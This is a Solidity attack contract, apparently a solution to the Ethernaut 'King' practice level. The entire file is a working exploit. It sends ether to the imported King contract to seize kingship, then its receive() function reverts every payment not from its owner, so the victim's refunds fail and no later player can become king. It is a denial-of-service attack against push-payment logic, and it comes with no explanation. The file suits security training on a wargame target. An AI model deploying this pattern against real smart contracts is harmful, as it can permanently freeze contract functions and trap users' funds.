// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {King} from "./King.sol";

contract KingAttack {
    King victim;
    address owner;
    constructor(address _victim) payable {
        victim = King(payable(_victim));
        owner = msg.sender;
    }

    function attack() public {
        address(victim).call{value: 1000000000000100}("");
    }


    receive() external payable {
        if(msg.sender != owner){
            revert();
        }
        
    }
}